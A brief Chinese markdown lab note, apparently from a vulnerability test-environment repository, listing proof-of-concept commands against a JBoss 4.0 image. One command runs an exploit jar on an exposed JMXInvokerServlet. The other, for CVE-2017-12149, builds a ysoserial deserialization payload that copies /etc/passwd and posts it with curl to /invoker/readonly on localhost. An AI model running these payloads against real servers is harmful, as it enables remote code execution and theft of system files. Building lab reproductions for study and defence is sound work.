## 运维安全 - JMXInvoker/HTMLAdaptor/... 对外暴露

测试镜像

* src/base/jboss4.0

Poc

```
java -jar jboss_exploit_fat.jar -i http://127.0.0.1/invoker/JMXInvokerServlet
```

## CVE-2017-12149 - /invoker/readonly 反序列化漏洞

测试镜像

* src/base/jboss4.0

参考文档

* [JBoss反序列化漏洞（CVE-2017-12149）](https://zhuanlan.zhihu.com/p/33532884)

Poc

```
# 生成 payload
java -jar /tmp/ysoserial.jar Jdk7u21 "cp /etc/passwd /tmp" > test

# 提交
curl -vv http://127.0.0.1/invoker/readonly --data-binary @test
```

